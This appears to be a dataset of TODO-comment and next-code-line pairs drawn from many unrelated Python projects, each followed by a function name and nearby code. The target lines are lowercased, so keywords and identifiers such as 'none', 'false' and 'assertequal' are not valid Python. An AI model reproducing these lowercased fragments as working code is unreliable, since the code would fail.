# todo: could refactor this, probably </s> new_sents = []	augment_telugu random.seed(1234) sents = read_sentences_from_conllu(input_conllu) for sentence in sents: if not sentence[1].startswith("# text"):
# todo(pachristopher): remove this once tfdv 0.14 is released. </s> (major, minor, _) = tfdv.__version__.split('.')	_ComputeTFDVStats | 'EncodeTFDV' >> beam.Map( EncodeTFDV, feature_specs=feature_specs_from_schema)) if int(major) > 0 or int(minor) >= 14: result |= ('BatchExamplesToArrowTables' >>
# todo: implement auto-dtype method in general parameters </s> zlp.data = zlp.data.astype('float32')	extract_zero_loss_peak E = Eaxis.axis[:Eaxis.size*.5] zlp.data[td < E] = 0 for s in zlp: ith = Eaxis.value2index(td[axes.coordinates])
# todo should be outside the 'with' block </s> assert sio.getvalue() == '@a/1 comment\ntta\n+\n##h\n@a/2 comment\ngct\n+\nhh#\n@b/1\ncc\n+\nhh\n@b/2\ntg\n+\n#h\n'	test for read1, read2 in reads: writer.write(read1, read2)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_inputs_implicit_insufficient def test_fail_inputs_implicit_insufficient(self): Account's total balance is not enough to cover spend amount.
# todo: if none, then get from the filename </s> sequences = seqio.parse(fname, file_type, alphabet)	encode_bio_sequence if alphabet is None: alphabet = IUPACUnambiguousDNAWithN() return seq_one_hot_encode(sequences, alphabet.letters)
# todo: proper partitioning of unittests </s> break	do_sweep if __debug__: if '_QUICKTEST_' in debug.active:
await self._stream.reset()  # todo: specify error code </s> def __aiter__(self):	Stream pass async def reset(self): return self async def __anext__(self):
# todo(kan-bayashi): need to make more smart way </s> ys = [y[y != self.ignore_id] for y in ys_pad]  # parse padded ys	Decoder :param ys: :return: hlen = list(map(int, hlen)) self.loss = None
# todo: fix </s> start_id = -1	_generate_latest def _generate_latest(url, django_model): received_count = django_model.objects.count() if url.find("?") == -1: url = url + "?"
# todo: document! </s> if q_oper.type != "super" or q_oper.superrep != "choi":	_generalized_kraus def _generalized_kraus(q_oper, thresh=1e-10): raise ValueError("Expected a Choi matrix, got a {} (superrep {}).".format(q_oper.type, q_oper.superrep)) dL, dR = map(int, map(sqrt, q_oper.shape))
if optimizer in ['adam', 'adadelta', 'rmsprop', 'sgd', 'sgdmomentum']: #todo: this could also be done for other optimizers </s> cost = f_update(lrate, x, x_mask, y, y_mask)	train last_disp_samples += xlen last_words += (numpy.sum(x_mask) + numpy.sum(y_mask))/2.0 else: cost = f_grad_shared(x, x_mask, y, y_mask)
# todo assert increasing timestamp? </s> datas = db.execute('select * from data order by log_index')	measurements new = 0 with sqlite3.connect(f'file:{f}?immutable=1', uri=True) as db: for _, tss, temp, hum, pres, dew in datas: tot += 1
if self._ndim == 3: # todo: use hasz </s> array = c_double * 3	ctypes @property def ctypes(self): return array(self.x, self.y, self.z) else:
recording_name = none  # todo </s> system_info = none #todo	_recording_update_legacy_from_v1_15_to_pprf_2_0 recording_software_name = None  # TODO recording_software_version = None  # TODO new_info_file = RecordingInfoFile.create_empty_file(rec_dir) new_info_file.recording_uuid = recording_uuid
# todo: refactor accordingly when v3 websocket api is released </s> output["results"].update({	BittrexAPIOrderBookDataSource if _is_snapshot(msg): output["results"] = _decode_message(msg["R"]) "M": f"{output['results']['M'].split('-')[1]}-{output['results']['M'].split('-')[0]}" })
# todo change to native framework call, when plex allows token in header </s> opener = urllib2.build_opener(urllib2.httphandler)	GETVIEWSTATE unwatchedXML = XML.ElementFromURL(fetchUrl) else: request = urllib2.Request(fetchUrl) request.add_header(
# todo: make test method </s> ssl             # missing ssl extension?	test_ssl def test_ssl(): import ssl return True
# todo: must be implemented </s> pass	get_range_from_chapters def get_range_from_chapters(self, crawler, times=0):
rm.fetch(refspec=refspec, progress=progress, **kwargs)  # todo: progress +kwargs </s> else:	fetch with rm.repo.git.custom_environment( GIT_SSH_COMMAND="ssh -S %s" % cnct.ctrl_path): rm.fetch(refspec=refspec, progress=progress, **kwargs)  # TODO: progress +kwargs
# todo: implement this </s> pass	_chmod_u_rx def _chmod_u_rx(path, recursive=False):
# todo: with git <= 2.3 keep old mechanism: </s> with rm.repo.git.custom_environment(	fetch cnct = ssh_manager.get_connection(fetch_url) cnct.open() GIT_SSH_COMMAND="ssh -S %s" % cnct.ctrl_path): rm.fetch(refspec=refspec, progress=progress)  # TODO: progress +kwargs
# todo: given trial, a repo, and an observer </s> pass	test_in_memory_hyperparams_repository_should_be_observable def test_in_memory_hyperparams_repository_should_be_observable(): repo: InMemoryHyperparamsRepository = InMemoryHyperparamsRepository()
#@todo: re-enable test when exception handling is in place </s> uri=ns.lookup("test.object3")	testRegisterEtc ns.register("test.sub.objectA",Pyro.core.PyroURI("PYRO:AAAAAA@host.com")) ns.register("test.sub.objectB",Pyro.core.PyroURI("PYRO:BBBBBB@host.com")) self.assertEqual(Pyro.core.PyroURI("PYRO:333333@host.com"), uri) ns.remove("unknown_object")
# todo: change this to use assertsetequal: </s> self.assertequal(true, all(updateddoc[k] == originaldoc[k] for k in updateddoc.keys()	test_field_update self.assertEqual(len(updatedDoc.keys()), len(originalDoc.keys())) self.assertEqual(updatedDoc['popularity'], originalDoc['popularity'] + 5) if k not in ['_version_', 'popularity'])) self.solr.add([
# todo(ayoung): support the ability for a project acting as a domain </s> def _is_admin_project(project):	_populate_scope def _populate_scope(self, token_data, domain_id, project_id): r = CONF.resource return (project['name'] == r.admin_project_name and
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_depth_string def test_fail_depth_string(self):
# todo for windows: </s> try:	handler def handler(signal_received, frame): kill_cmd = "screen -r -S %s -X quit" % screen_name subprocess.check_call(kill_cmd, shell=True) except:
# todo(gibi): remove this when live migration is fully supported and </s> self._turn_off_api_check()	test_live_migrate_with_qos_port_abort_migration def test_live_migrate_with_qos_port_abort_migration(self): non_qos_normal_port = self.neutron.port_1 qos_normal_port = self.neutron.port_with_resource_request
# todo(albert): windows machines don't have a readline module. </s> readline.clear_history()	_read_lines self.log = [] self.logger.register_log(self.log) for line in lines: self._add_line_to_history(line)
# todo: may test file contents </s> temp = tempfile.namedtemporaryfile(delete=false)	test_export_to_csv_filename def test_export_to_csv_filename(self): self.files_to_delete.append(temp.name) rows.export_to_csv(utils.table, temp.name)
# todo: refactor codebase to avoid needing this kind of special case check by being more </s> if self.id == 'python' and self.is_installed():	install_tool def install_tool(self): print("Skipped installing " + self.name + ", already installed.") return True
# todo(chen3feng): reuse cclibrary </s> self.data['generate_dynamic'] = (getattr(options, 'generate_dynamic') or	__init__ self.data['deprecated'] = deprecated options = self.blade.get_options() config.get_item('cc_library_config', 'generate_dynamic')) sources, headers = [], []
# todo: the eigenvector associated with the smallest eigenvalue </s> opt_ori = eig_vecs[:, idx_middle]	_apply_lcmv if i != eig_vals.argmax() and i != eig_vals.argmin(): idx_middle = i Wk[:] = np.dot(opt_ori, Wk) Ck = np.dot(opt_ori, np.dot(Ck, opt_ori))
# todo: integrate this into emrjobrunner </s> step_num_to_id = runner._step_num_to_id()	_ls_logs def _ls_logs(runner, log_type, step_nums=None): return runner._ls_logs(log_type, step_nums=step_nums,
# todo: use ledgerprocessor </s> commcarecase.get_db().bulk_save(result.relevant_cases)	reprocess_form to_save.commit() result.commit()
# todo(mlavalle) this notification should be updated to publish when </s> registry.notify(address_group, events.after_create, self,	create_address_group self.add_addresses(context, ag.id, fields) ag.update()  # reload synthetic fields context=context, address_group_id=ag.id) return self._make_address_group_dict(ag)
# todo: warn if not used with -t roles </s> self.parser.add_argument("-r", "--roles-path", dest='roles_path', default=c.default_roles_path,	init_parser self.parser.add_argument("-j", "--json", action="store_true", default=False, dest='json_format', help='Change output into json format.') type=opt_help.unfrack_path(pathsep=True), action=opt_help.PrependListAction,
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
pass  # todo </s> def test_picture(self):	test_picture
# todo add verbose output </s> return self._host	ConnectionModel @property def host(self): @host.setter def host(self, new_host: str):
# todo untested </s> 1/0	__setattr__ self._name, nid, _api.MBSTRING_UTF8, value, -1, -1, 0) if not add_result:
# todo: timeline is global, get rid of it </s> posts = [x for x in timeline if x.use_in_feeds]	gen_task_render_indexes translations template_name = "index.tmpl" lists = [] while posts:
#todo: proper implementation </s> return {"term": {field: value}}	FilterToElasticFilter return {"term": {field: value}} def first_of(self, field, value): def matches(self, field, value): return {"text": {field: value}}
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: don't let this crash the robot </s> assert r_body_foot_yz >= abs(config.abduction_offset)	leg_explicit_inverse_kinematics R_body_foot_yz = (y ** 2 + z ** 2) ** 0.5 R_hip_foot_yz = (R_body_foot_yz ** 2 - config.ABDUCTION_OFFSET ** 2) ** 0.5 phi = np.arccos(config.ABDUCTION_OFFSETS[leg_index] / R_body_foot_yz) hip_foot_angle = np.arctan2(z, y)
# todo(stubexecutor): (optional) use stubbed_component_map to insert custom stub </s> self.stubbed_component_map = {}	__init__ 'SchemaGen', 'ExampleValidator', 'Trainer', 'Transform', 'Evaluator', 'Pusher'] for c_id in self.stubbed_component_ids: self.stubbed_component_map[c_id] = base_stub_executor.BaseStubExecutor
# todo: get rid of this </s> self._set_state(msg["command_context"])	_poll_vm_messages return if "command_context" in msg: elif msg["message_type"] == "ToplevelResult": self._set_state("waiting_toplevel_command")
# todo: refactor this into a django form </s> from datetime import datetime	add_config @require_POST def add_config(request, domain=None): POST = json.loads(request.raw_post_data) if 'name' not in POST or not POST['name']:
# todo: make this more portable with shutil etc. </s> run = phlsys_subprocess.run	test_can_commit def test_can_commit(self): runCommands = phlsys_subprocess.run_commands path = "phlsys_git_TestGitContext"
# todo: test for last revision minus 50 on second page. </s> offset = url_for(controller='revision', action='list')	test_list_long self.create_100_revisions() try: res = self.app.get(offset) self.assert_click(res, '2', 'Revision 2')
# todo(b/1613650790: move this logic to ppoklpenaltyagent. </s> if self._initial_adaptive_kl_beta > 0:	_train loss_info.extra.entropy_regularization_loss) kl_penalty_losses.append(loss_info.extra.kl_penalty_loss) policy_state = self._collect_policy.get_initial_state(batch_size) kl_divergence = self._kl_divergence(
# todo: implement test </s> pass	test_bind def test_bind(self):
# todo: write tests </s> from any tag with @meter.count and @meter.unit attributes, make a :class:`timesignature`.	_timeSigFromAttrs def _timeSigFromAttrs(elem): :param :class:`~xml.etree.ElementTree.Element` elem: An :class:`Element` with @meter.count and @meter.unit attributes.
# todo xxx graalvm change </s> raise unittest.skiptest("missing threading support")	ThreadedEchoServer self.daemon = True def __enter__(self): self.start(threading.Event()) self.flag.wait()
pass # todo doing nothing is also a possibility </s> elif op_enum == cairo.operator.dest_in: # blur	_set_thumbnail_color cairo_context = cairo.Context(surface) if op_enum == cairo.Operator.CLEAR: pass # TODO doing nothing is also a possibility else:
# todo: this might need a better test </s> subpixel_step = warper.compute_subpixel_step()	test_depth_warper xy_projected = warper._compute_projection(0.0, 0.0, 1.0) assert xy_projected.shape == (1, 2) assert pytest.approx(subpixel_step.item(), 0.3536)
#todo raise error or others </s> return	on_backup_button_clicked if sterror: log.error(sterror) dirlist = stdout.split() dirlist.sort()
# todo: arrange </s> result_subprofile_remove = self.remote.remove_profile("testsubprofile0", self.token)	test_remove_profile def test_remove_profile(self): Test: remove a profile object result_profile_remove = self.remote.remove_profile("testprofile0", self.token) self.assertTrue(result_subprofile_remove)
# todo consider adding the individual tiles to the resource? </s> tilesets.append(tileset)	load_tmx path = resource.find_file(c.attrib['source']) tileset = TileSet.from_atlas(name, firstgid, path, tile_width, tile_height) resource.add_resource(name, tileset) elif c.tag == 'tile':
# todo(iceboy): rate limit base on ip. </s> pdoc = await problem.get(self.domain_id, pid)	ProblemPretestHandler async def post(self, *, pid: document.convert_doc_id, lang: str, code: str, data_input: str, data_output: str): post = await self.request.post() content = list(zip(post.getall('data_input'), post.getall('data_output')))
# todo map relationship backreferences using the django names </s> self.base.prepare(self.engine, reflect=true)	__init__ self.session, self.engine = make_session(self.connection_string) self.Base = automap_base() self.set_all_class_defaults()
# todo this is not tested yet. </s> print 'not tested'	cequantile def cequantile(t, a, b, p): L = np.power((t+.0)/ a,b) quantile = a * np.power(-np.log(1. - p) - L,1. / b)
else: # todo support ssl </s> contextfactory = none	do_notify contextFactory = ssl.ClientContextFactory() contextFactory.method = SSL.SSLv3_METHOD message = mail.Message(from_addr=u, to_addrs=to_addrs,
# todo: implement this for mesh tallies </s> elif self.domain_type == 'mesh':	get_subdomain_avg_xs avg_xs.domain_type = 'cell' avg_xs._offset = 0 raise NotImplementedError('Average mesh xs are not yet implemented') for tally_type, tally in avg_xs.tallies.items():
# todo: exp_block_pairs </s> self.assertequal(13, p._pos)	testStatIfElse self.assertIsNotNone(node)
#there's nothing todo </s> def __adding_loop(self,tid,inroot):	FilteredTree if curdis: self.__remove_node(tid) if self.tree.has_node(tid) and not self.is_displayed(tid):
# todo: change </s> return data_from_set(self.dataset, self.slices, i)	get_data def get_data(self, i):
# todo: lamp texture test.. </s> if n.inputs[0].is_linked:	export_lamp elif o['type'] == 'sun': o['strength'] *= 0.4 color_node = n.inputs[0].links[0].from_node if color_node.type == 'TEX_IMAGE':
# todo cache? </s> files = list(sorted(config.storage_path.glob('user_*.json')))	users def users() -> Users: res = {} for f in files:
# todo implement. </s> yaml = self.master_model.to_yaml()	_train def _train(self, rdd, nb_epoch, batch_size, verbose, validation_split):
""" a completed todo must start with an x followed by a date. """ </s> todo = todobase.todobase("x 2014-06-14 not complete")	test_completion4 def test_completion4(self): self.assertFalse(todo.is_completed())
# todo: log.warning("tried to release connection that did not exist any longer : {0}".format(connection)) </s> self._available_connections.setdefault(connection._node["name"], []).append(connection)	release else: pass
# todo, make connection _cache attr public </s> reader = objectreader(conn, conn._cache, self._factory)	load_multi_oid def load_multi_oid(self, database_name, oid): conn = self._conn.get_connection(database_name) return reader.load_oid(oid)
# @todo: support for branches </s> fields.append("human_resource.organisation_id$name")	apply_method show_orgs = settings.get_hrm_show_organisation() if show_orgs: name_format = settings.get_pr_name_format() import re
# todo verify the stream </s> stream.seek(0)	test_capture_to_stream camera.stop_recording()
# todo: consider using eafp here instead. </s> if callable(attr):	_get_value if hasattr(context, key): attr = getattr(context, key) return attr() return attr
# todo xxx graalvm change </s> raise unittest.skiptest("not supported")	test_sni_callback_wrong_return_type @needs_sni def test_sni_callback_wrong_return_type(self): server_context, other_context, client_context = self.sni_contexts() def cb_wrong_return_type(ssl_sock, server_name, initial_context):
##? value()  --- todo fix support for tuple assignment </s> value	mapping for key, value in p.items(): key for key in r: key
# todo: delet this when all preprintproviders have a mapping </s> from osf.models.subject import subject	top_level_subjects return self.subjects.filter(parent__isnull=True) else: if len(self.subjects_acceptable) == 0: return Subject.find(Q('parent', 'isnull', True))
@unittest.skip('not written')  # todo: finish! </s> self.assert_shortened([value], "[b'aaaaaaaaaaaaaaaaaa...aaaaaaaaa']")	test_bytes_large "b'" + 'A' * 43688 + "..." + 'A' * 21844 + "'")
# todo use abi </s> if self.avoid_null and snapshot.output_reg["rax"] == 0:	prune_snapshots already_keeped = {} # path -> seen number for snapshot in self.trace_iter: ignored += 1 continue
# todo: only consider the right ones for sources and targets </s> plural_unit = store.addsourceunit(sources)	_append_plural_unit sources = [u.source for u in units] targets = [u.target for u in units] plural_unit.target = targets plural_unit.addlocation(plural)
# todo: is this used? </s> if decode:	MongoDocumentField else: self.encode = lambda x: x self.decode = eval(compile(decode, '__decode__', 'eval'), copy.copy(MONGO_EVAL_NS)) else:
# todo: currently stubs internal method, should provide stub </s> pairing._get_private_ip_addresses = \	setUp self.loop, REMOTE_NAME, PIN_CODE, pairing_guid=pairing.DEFAULT_PAIRING_GUID) lambda: [ipaddress.ip_address('10.0.0.1')]
# todo: make treecount configurable via an inputslot </s> rf=vigra.learning.randomforest(100)	OpTrainRandomForest featMatrix=numpy.concatenate(featMatrix,axis=0) labelsMatrix=numpy.concatenate(labelsMatrix,axis=0) try: RF.learnRF(featMatrix.astype(numpy.float32),labelsMatrix.astype(numpy.uint32))
# todo: must be implemented </s> pass	get_range_using_index def get_range_using_index(chapter_count):
# todo: supporting fat binaries will be annoying. </s> self._warnunimplemented("archs")	GetLdflags archs = self.GetActiveArchs(self.configname) if len(archs) != 1: archs = ["i386"] ldflags.append("-arch " + archs[0])
# todo test </s> return dict(	aliased_storage_property @property def aliased_storage_property(self): (prop, self[prop]) for prop, aliased in self._item.aliases.items()
# todo: clean up this event print out. we probably want something </s> if suffix == 'new':  # skip "new" events	print_async_returns Print all of the events with the prefix 'tag' for suffix, ret in self.get_async_returns(tag, timeout=timeout): continue elif suffix == 'ret':  # for "ret" just print out return
# todo order this!!!!!! </s> if "tetra10" in cells:	_read_cells output_cell_tags[key]["mdpa:geometrical"], dtype=int ) cells["tetra10"] = cells["tetra10"][:, [0, 1, 2, 3, 4, 5, 6, 7, 9, 8]] if "hexahedron20" in cells:
self.button_align_test = wx.button(self, label="align test")    # todo maybe align left? </s> self.button_help = wx.button(self, label="help")                # todo maybe align left?	__init__ self.sizer_setting_hotkey = wx.StaticBoxSizer(wx.VERTICAL, self, "Hotkey") self.button_apply = wx.Button(self, label="Apply") self.button_close = wx.Button(self, label="Close")
# todo: where to store config? </s> db = mysqldb.connect(	ingest_upload_atk_get_resource_component_and_children def ingest_upload_atk_get_resource_component_and_children(resource_id, resource_type='collection'): resource_data = {}; host="localhost", user="root",
# todo: make handlers for modelfactoryevent from within the gui obj </s> model = self.tree_model	_new_model_content Open the toplevel element and load toplevel diagrams. self.tree_view.expand_root_nodes() try: iter = model.get_iter((0,))
# todo optimize: special case where there is only one dynamic </s> if abi_t.is_dynamic():	abi_encode abi_t = abi_type_of(o.typ) if parent_abi_t.is_complex_type(): lll_ret.append(["mstore", dst_loc, dyn_ofst]) child_dst = ["add", dst_begin, dyn_ofst]
# todo integrate param when g is a clustered graph </s> global window_list	pg_plot_graph >>> sen = graphs.Logo() >>> plotting.plot_graph(sen) if 'window_list' not in globals(): window_list = {}
#todo: add csrf here? or make ids uuid so they can't be guessed? </s> def _index_post(request):	_index_POST api_token = request.POST.get('api_token', None) if not api_token:
#todo set the correct varname here </s> writefile.writesafe(self.jsontree, f, self.jsvarname )	exportJS def exportJS(self, charsn):
# todo: get rid of this copout and find a way to deal </s> if type(x[0]) == pd.timestamp:	zero_range if len(x) != 2: raise GgplotError('x must be length 1 or 2') return False if any(np.isnan(x)):
# todo: this should be made more flexibly to handle differeing params for xform submission </s> try:	get_response attachments = {} if self.request.META['CONTENT_TYPE'].startswith('multipart/form-data'): instance = self.request.FILES[self.magic_property].read() except MultiValueDictKeyError:
# todo(pfnet): implement crop function </s> h = score_pool4	__call__ h = self.upscore2(score_fr) upscore2 = h  # 1/16 for axis in [2, 3]: start = 5
# todo make this configurable </s> w.buffer_set(buf, "highlight_tags_restrict", "matrix_message")	matrix_create_room_buffer W.buffer_set(buf, "nicklist", "1") W.buffer_set(buf, "nicklist_display_groups", "0") server.buffers[room_id] = buf server.rooms[room_id] = MatrixRoom(room_id)
# todo(yanase): check values </s> assert len(weights) == 2	test_calculate_without_prior consider_endpoints=consider_endpoints, weights_func=default_weights) assert len(mus) == 2 assert len(sigma) == 2
# todo: update graph references </s> elif isinstance(src, list):	MetaCollection self.name = src.name  #? See Collection: How to treat names in case of a copy? self.store = deepcopy(src.store) for item in src: if isinstance(item, Collection):
# todo: figure out a way to not trigger the "action_auth_started" when </s> http_referer = request.meta.get("http_referer")	dispatch def dispatch(self, request): if http_referer:
self.prob.cleanup()  # closes recorders todo_recorder: need to implement a cleanup </s> expected_driver_metadata = none	test_driver_doesnt_record_metadata self.prob.driver.add_recorder(self.recorder) self.prob.setup(check=False) self.assertMetadataRecorded() self.assertDriverMetadataRecorded(expected_driver_metadata)
# todo: test logging messages. </s> self.manager.startup()	test_shutdown def test_shutdown(self): self.manager.shutdown() self.assertEquals(self.states, [])
# todo fix the fold to allow any number of dispositions </s> return (	admitted_patients_chart y_scale.domain = (0, max_y_axis) y_scale.clamp = True alt.Chart(census.head(plot_projection_days)) .transform_fold(fold=["hospitalized", "icu", "ventilated"])
# todo: make the get_closest_value to return region </s> date, date_index = self.get_closest_value(	get_current_date if self.current_value.get('value'): return False self.view.substr(self.view.line(self.region)), self.view.line(self.region).begin(),
# todo: will work only if table.fields is ordereddict </s> filename, fobj = get_filename_and_fobj(filename_or_fobj, mode='w')	export_to_json *args, **kwargs ): ilist = serialize_json(table, encoding=encoding, *args, **kwargs) fobj.write(json.dumps(list(ilist), encoding=encoding))
1  # todo: fill in identifier </s> )	test_automatic_dispute direct_transfer = channel1.create_directtransfer( amount, direct_transfer.sign(privatekey1, address1) channel0.register_transfer(direct_transfer)
# todo: make daemon? </s> self._listener = threading.thread(target=self._listen)	_start self._port = port self._connect() self._listener.start()
# todo: refactor into one function that just takes nodes </s> for j in range(child_count):	add_scanner_count total_issues = 0 child_count = node.getChildCount() child = node.getChildAt(j) tree_param_name = child.toString()
# todo ? </s> eq_(	test_comparator eq_(Foo.foo.method2('x'), "method2") assert Foo.foo.attr == 'bar' (Foo.foo == 'bar').__str__(), "foo = upper(:upper_1)"
# todo: check whether loaded network has the same number of classes as specified in ilastik! </s> self._loaded_pytorch_net.train(reordered_feature_images, reordered_labels)	create_and_train_pixelwise self._opReorderAxes.AxisOrder.setValue('zcyx') reordered_labels.append(self._opReorderAxes.Output([]).wait()) logger.info(self.description) return TikTorchLazyflowClassifier(self._loaded_pytorch_net, self._filename)
assert isinstance(obj_type, instance)  # todo more flexible </s> typeinfo = (cast(instance, obj_type)).type	visit_member_expr obj = self.accept(e.expr) obj_type = self.types[e.expr] target = self.target_register() if e.direct:
# todo(stevemar): remove the line below when we support multitenancy </s> project._info.pop('parent_id', none)	CreateProject else: raise e return zip(*sorted(six.iteritems(project._info)))
# todo find out what's going on </s> self.degree = 1	__init__ def __init__(self): self.name = 'MaeztuSainz' self.weights = numpy.concatenate([ numpy.full(1, -0.3229059250896649),
# todo(b/141131288): enable complex-valued sorts on tpu. </s> if (onp.issubdtype(key_dtype, onp.complexfloating) and (	testSortKeyVal for axis in [-1, len(shape) - 1])) def testSortKeyVal(self, shape, key_dtype, val_dtype, axis): (jtu.device_under_test() == "cpu" and jax.lib.version <= (0, 1, 47)) or jtu.device_under_test() == "tpu")):
# todo(blk-u): this doesn't look like it works as expected. </s> self.assertequal(	test_no_version_path def test_no_version_path(self): 'http://localhost/identity', auth.replace_version('http://localhost/identity', 'v2.0'))
# todo: content-type </s> encoder = httpjsonconverter()	handle_one_request self._ReadPostData() result = self.HandleRequest() encoded_result = encoder.Encode(result) self.send_response(200)
# todo(dougwig) - remove this disable when fixing bug #1816874 </s> fip_statuses[fip['id']] = self.migrate_centralized_floating_ip(	process_floating_ip_addresses LOG.debug("Floating IP is migrating from centralized " "to distributed: %s", fip) fip, interface_name, device) elif fip_statuses[fip['id']] == fip['status']:
# # todo: should be able to just access the api from qml. </s> return []	foundDevices else:
# todo: reimplement this. </s> def run(self, count=1, mode=none):	_vi_big_b class _vi_big_b(ViMotionCommand): def do_motion(view, s): if mode == modes.NORMAL:
# todo: add ssl verification </s> configuration = client.configuration()	get_api_client def get_api_client(cluster_name, cluster_endpoint, challenge, evalai): aws_eks_api = evalai.get_aws_eks_bearer_token(challenge.get("id")) configuration.host = cluster_endpoint
# todo test for final </s> return "/%s" % self.canonical_filename()	url def url(self):
pass  # todo </s> def test_render(check_call):	test_render
# todo: maybe[int] and maybe[simple_sum] are invalid </s> elif type_name == 'int':	_DefaultValue else: default = 'None' pass elif type_name == 'id':  # hard-coded HACK
# todo: check for existing record first. </s> existing = session.query(cls).filter_by(slug=slug).first()	register @classmethod def register(cls, slug, session): if existing: self = existing
# todo(stephenfin): remove the hardcoded limit, possibly overridding </s> self.compute = self.start_service('compute', host='compute1')	_run_build_test def _run_build_test(self, flavor_id, end_status='ACTIVE', expected_usage=None): compute_rp_uuid = self.placement_api.get( '/resource_providers?name=compute1').body[
# todo: abstract this away into a function. </s> read_only = false	eval return elif self.action and self.motion: if self.view.file_name(): mode = os.stat(self.view.file_name())
# todo: this is untested. </s> _raise_current_error()	shutdown result = _lib.SSL_shutdown(self._ssl) if result < 0: elif result > 0: return True
# todo: cache properly </s> rules = frappe.get_all('energy point rule', filters={	process_energy_points if frappe.flags.in_patch or frappe.flags.in_install or not is_energy_point_enabled(): return 'reference_doctype': doc.doctype, 'enabled': 1
# todo: cannot be loaded with plugins; improve this solution </s> d = helpers.import_from_plugin("googleapiclient.discovery", plugin="bigquery")	create_dialect def create_dialect(self, resource, *, descriptor): try: if isinstance(resource.source, d.Resource): return BigqueryDialect(descriptor)
#todo : what if multiple projects are selected ? </s> p = pid[0]	on_edit_task def on_edit_task(self,widget,row=None ,col=None) : pid,tid = self.get_selected_task() if tid : zetask = self.projects[p][1].get_task(tid)
# todo extend to nonbinary nodes </s> if i not in self._input_indices and i in self.context.node_indices:	__init__ else: self._dimension_labels.append(None) past_tpm_on = past_tpm_on.sum(i, keepdims=True) / 2 past_tpm_off = past_tpm_off.sum(i, keepdims=True) / 2
# todo: enhance and use textlib.multitemplatematchbuilder </s> no_license = i18n.translate(self.site, txt_find)	isTagged def isTagged(self) -> bool: if not no_license: raise TranslationError(
# todo: speed up by initalising devicemanager() once - param maybe? </s> devman = rclient.devicemanager()	get_device_list devices = [] try: devman.sync_effects = False rdevices = devman.devices
# todo replace with collections.sequence subclass </s> spotify.error.maybe_raise(self.error)	artists def artists(self): Will always return :class:`None` if the search isn't loaded. if not self.is_loaded: return None
# todo how to handle this when parent class has no embedders? </s> self._base_model._entity_embedder.prepare_job(job, **kwargs)	prepare_job def prepare_job(self, job, **kwargs): self._base_model._relation_embedder.prepare_job(job, **kwargs)
# todo(dcramer): it'd be nice to support more than this, but its </s> cursor_result, _ = search_fn()	delete_groups else: try: except ValidationError as exc: return Response({'detail': six.text_type(exc)}, status=400)
# todo: actually apply </s> pass	__actions_read self.back_to_parent() elif self.cur_action == 1: # apply elif self.cur_action == 2: #  OK self.back_to_parent()
# todo: write tests </s> from ..mac.drawing import rectfromnsrect	getGlyphRunFromTextInfo def getGlyphRunFromTextInfo(self, textInfo, **kwargs): text = textInfo.text runLengths = textInfo.runLengths
# todo(slaweq): remove that is_admin check and always perform rules checks </s> if not cfg.conf.oslo_policy.enforce_new_defaults and context.is_admin:	enforce :raises oslo_policy.policy.PolicyNotAuthorized: if verification fails. return True rule, target, context = _prepare_check(context, action, target, pluralized)
# todo: maybe introduce a "closest_wall_or_door_given_dir" function to decide between right and left </s> return actions.left	get_action_from_subgoal if not fwd_cell: return actions.forward return self.get_action_from_subgoal('GoNextTo', adj_pos) if subgoal == 'Explore':
# todo: need to cleanup the named argument mess before it is possible. </s> pass	computeNode if star_dict_arg is not None: if star_dict_arg.isExpressionMakeDict(): elif star_dict_arg.isExpressionConstantRef(): pass
# enforce no minor ticks labels. todo: document? </s> axis.set_minor_formatter(mticker.nullformatter())	_apply_axis_sharing if level > 2: axis.set_major_formatter(mticker.NullFormatter())
# todo: checking for sys.stdout.isatty() prevents shell redirections and pipes (useful for list commands). can we remove this check? </s> if not quiet and sys.stdout.isatty():	println def println(msg, console_prefix=None, end="\n", flush=False, logger=None, overline=None, underline=None): complete_msg = "%s %s" % (console_prefix, msg) if console_prefix else msg if overline:
# todo tags: ipdb </s> if index in master['ports']:	update_slaves master['ports'].add(index) elif msg['event'] == 'RTM_DELLINK': master['ports'].remove(index)
#todo change to native framework call, when plex allows token in header </s> opener = urllib2.build_opener(urllib2.httphandler)	deletePlayLIstforUsr url = misc.GetLoopBack() + '/playlists/' + key try: request = urllib2.Request(url) request.add_header('X-Plex-Token', token)
# todo: need to add counter </s> return true	send_profile if super(self.__class__, self).sendDirectItem('profile', user_ids, text=text, thread=thread_id, profile_user_id=profile_id): self.logger.info("Message to {user_ids} wasn't sended".format(user_ids=user_ids)) return False
none, fifo_mode=false,  # todo python3: fifo mode fails in py3, needs fix </s> result_store=none	test_noref_moment_fextractor_with_noref_asset_notyuv self.fextractor = MomentNorefFeatureExtractor( [asset], ) self.fextractor.run()
# todo: detect if this untracked pending transaction is a commitment transaction at all. </s> self.__pending[0] = untracked_pending_transaction	__track_pending_commitments tx_tracker_is_ok = self.__tracking_consistency_check() if not tx_tracker_is_ok: return True if not self.__pending:
# todo: finish me </s> pass	clean_weight_band def clean_weight_band(value):
# todo: find these references and ensure they are closed </s> if is_win:	close if self.git: self.git.clear_cache() gc.collect() gitdb.util.mman.collect()
# todo return empty list if not loaded </s> spotify.error.maybe_raise(self.error)	albums def albums(self): Will always return :class:`None` if the search isn't loaded. if not self.is_loaded: return None
# todo(rbharath): this should be modified to contain a cluster split so </s> splitters = {	load_pdbbind dataset = deepchem.data.DiskDataset.from_numpy(features, labels) transformers = [] 'index': deepchem.splits.IndexSplitter(), 'random': deepchem.splits.RandomSplitter(),
# todo discont: use offsets instead (note need for int conversion) </s> if (int(start) != tb_ann.start or int(end) != tb_ann.end):	_edit_span undo_resp['offsets'] = tb_ann.spans[:] undo_resp['type'] = tb_ann.type if not isinstance(tb_ann, TextBoundAnnotation):
